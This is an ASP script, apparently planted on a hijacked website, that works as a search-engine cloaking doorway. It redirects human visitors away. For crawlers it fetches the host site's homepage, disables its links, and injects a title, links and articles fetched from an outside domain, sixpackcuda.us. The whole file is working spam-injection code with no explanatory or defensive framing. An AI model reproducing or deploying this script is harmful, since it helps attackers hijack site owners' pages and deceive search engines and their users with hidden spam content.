<%

dim ua
ua = Request.ServerVariables("HTTP_USER_AGENT")
ua = LCase(ua)

Dim fname(7),i
fname(0) = "Googlebot"
fname(1) = "Baiduspider"
fname(2) = "Yahoo! Slurp"
fname(3) = "YodaoBot"
fname(4) = "msnbot"
fname(5) = "bot"
fname(6) = "crawl"
fname(7) = "spider"

Dim spider
spider = 0

For i = 0 to 7
	  dim j
	  j = fname(i)
	  j = LCase(j)
	  if instr(ua,j)>0 then
		spider = 1
	  end if
Next

dim inner
inner = Request.QueryString("id")

dim domain
domain = "http://www.sixpackcuda.us/a/5/"

dim url
url = domain & inner

dim mainurl
mainurl = Request.ServerVariables("http_host")

if spider<1 then

Dim u
u = "/"

Response.write("<script language=""javascript"" type=""text/javascript"">")
Response.write("self.location=""" & u & """;")
Response.write("</script>")

end if


On Error Resume Next 
Server.ScriptTimeOut=9999999 
Function getHTTPPage(Path) 
t = GetBody(Path) 
getHTTPPage=BytesToBstr(t,"utf-8") 
End function 
Function Newstring(wstr,strng) 
Newstring=Instr(lcase(wstr),lcase(strng)) 
if Newstring<=0 then Newstring=Len(wstr) 
End Function 
Function BytesToBstr(body,Cset) 
dim objstream 
set objstream = Server.CreateObject("adodb.stream") 
objstream.Type = 1 
objstream.Mode =3 
objstream.Open 
objstream.Write body 
objstream.Position = 0 
objstream.Type = 2 
objstream.Charset = Cset 
BytesToBstr = objstream.ReadText 
objstream.Close 
set objstream = nothing 
End Function 
Function GetBody(url) 
on error resume next 
Set Retrieval = CreateObject("Microsoft.XMLHTTP") 
With Retrieval 
.Open "Get", url, False, "", "" 
.Send 
GetBody = .ResponseBody 
End With 
Set Retrieval = Nothing 
End Function 


Function ReplaceTest(str, patrn, replStr)

  Dim regEx, str1, i

  str1 = str

  Set regEx = New RegExp
  regEx.Pattern = patrn

  regEx.Global = True
  regEx.IgnoreCase = True

  Set Matches = regEx.Execute(str1)
  
  For Each i in Matches

  str1 = regEx.Replace(str1, replStr)

  Next

  ReplaceTest = str1
  
End Function


dim str
str = getHTTPPage("http://" & mainurl)

if str="" or str=null then

str = getHTTPPage("http://www." & mainurl)

end if


dim link
link = getHTTPPage(url)

dim title
title = getHTTPPage("http://www.sixpackcuda.us/amae/title.php")

dim article
article = getHTTPPage("http://www.sixpackcuda.us/amae/")



if str<>"" or str<>null then

dim find
find = "<a"

dim replace
replace = "<div"

str = replacetest(str,find,replace)


find = "href="
replace = "id="
str = replacetest(str,find,replace)


find = "</title"
replace = "-" & title & "</title"
str = replacetest(str,find,replace)

find = "</body"
replace =  link & "</body"
str = replacetest(str,find,replace)


find = "</body"
replace =  article & "</body"
str = replacetest(str,find,replace)
 
response.write(str) 

else

response.write("<html><head><title>" & title & "</title></head><body>") 
response.write(title) 
response.write("<p></p>") 
response.write(link) 
response.write("<p></p>") 
response.write(article) 
response.write("<p></p>") 
response.write("</body></html>") 

end if



%>



